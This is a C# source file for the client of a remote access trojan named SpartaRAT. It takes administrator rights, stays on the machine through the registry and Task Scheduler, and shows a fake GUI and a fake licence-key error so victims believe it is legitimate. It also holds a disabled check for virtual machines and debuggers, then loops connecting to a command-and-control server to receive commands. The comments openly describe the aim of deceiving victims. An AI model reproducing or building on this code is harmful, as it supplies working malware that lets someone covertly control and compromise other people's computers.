using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Setup.PrivilegeCheck;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SpartaRATclient.Setup.OSType;
using SpartaRATclient;
using System.Net.Sockets;
using RATclientSparta.Server;
using Umbral.payload.Components.AntiVM;

namespace RATclientSparta
{
    public class Program
    {
        /// <summary>
        /// RAT Client side program
        /// </summary>
        [STAThread]
        private static void ConnectToHost()
        {
            while (true)
            {
                //Create Socket values
                System.Net.Sockets.Socket SocketValue = Socket.SocketServerClient.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                //Connecting to Server
                System.Net.Sockets.Socket SocketConnection = ServerEndpoint.Connect(SocketValue, "127.0.0.1", 81);

                //Calling to an instance constructor
                ServerData Connection = new ServerData(SocketConnection);

                //reading data from server - when connection lost, it will return and then Connect() again (While loop from beginning)
                Connection.Receive();
            }
        }
        static void Main()
        {
            //If debbuger or virtual machine detected, make the client think this is a legit app
            /*if (Detector.IsVirtualMachine())
            {
                OpenGUI(true);
                Environment.Exit(0);
            }*/

            if (!(RegistryCheck.CheckIfExist("HaveTaskSchedulerItem")))
            {
                if (!(RegistryCheck.CheckIfExist("HaveAdminPrivilege")))
                {
                    if (AdminGet.GetAdmin())
                    {
                        RegistryCreate.Create("OpenedAt", DateTime.Now.ToString());
                        RegistryCreate.Create("OsVersion", OSType.Type());

                        //When program gets privileges it will reopen as admin
                        //So i am closing this app because there is other app opened as admin
                        //I dont want this if to be run next time this program self opening it self, so I'm creating this value
                        RegistryCreate.Create("HaveAdminPrivilege", "");
                        Environment.Exit(0);
                    }
                    else
                    {
                        //This app must start as administrator
                        MessageBox.Show("Error: You must run this app as Administrator."); 
                        Environment.Exit(0);
                    }
                }
                else
                    //We just need admin privileges once, when the program opened at the first time.
                    //At the other times, the program will auto opened using Task Scheduler with the computer start. No need a admin alert to shown everytime..
                    RegistryDelete.DeleteValue("HaveAdminPrivilege");

                if(!RegistryCheck.CheckIfExist("FirstOpen"))
                OpenGUI(false);
            }

            //Connecting to C&C server
            ConnectToHost();
        }

        private static void OpenGUI(bool OpenEvenAfterFirstRun)
        {
            if (!OpenEvenAfterFirstRun)
            {
                //If "FirstOpen" registry data not exist, its the first time program opened.
                //the Fake GUI will open, only once in life.
                if (!(RegistryCheck.CheckIfExist("FirstOpen")))
                {
                    //At the first time opening this app a GUI box will be shown because I want Clients to think this is a legit app
                    RegistryCreate value = new RegistryCreate();
                    RegistryCreate.Create("FirstOpen", "0");
                    ShowGUI(true);
                }
                else
                {
                    //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
                    MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");

                    //From now, If the task scheduler item will created, OpenGUI function will never executed again and even the fake error message will not shown.
                    //This technic makes the clients think this app is not a virus.
                }
                //At the first time opening this app a GUI box will be shown because I want Clients to think this is a legit app
                RegistryCreate.Create("FirstOpen", "0");
                GUIApp application = new GUIApp();
                new Thread((() => { application.ShowDialog(); })).Start();
            }
            else
            {
                //Debugger or virtual machine detected
                ShowGUI(false);
            }

            void ShowGUI(bool AsThread)
            {
                //When form is running as thread it will not block the code
                //When form is not running as thread it will block the code and will not continue (For example, when this function got called by the anti debugger function, I want the code not to run, just to stop there, and then Enviroment.Exit() will close the program)
                if (AsThread)
                {
                    GUIApp application = new GUIApp();
                    new Thread((() => { application.ShowDialog(); })).Start();
                }
                else
                {
                    GUIApp application = new GUIApp();
                    application.ShowDialog();
                }
            }
        }
    }
}
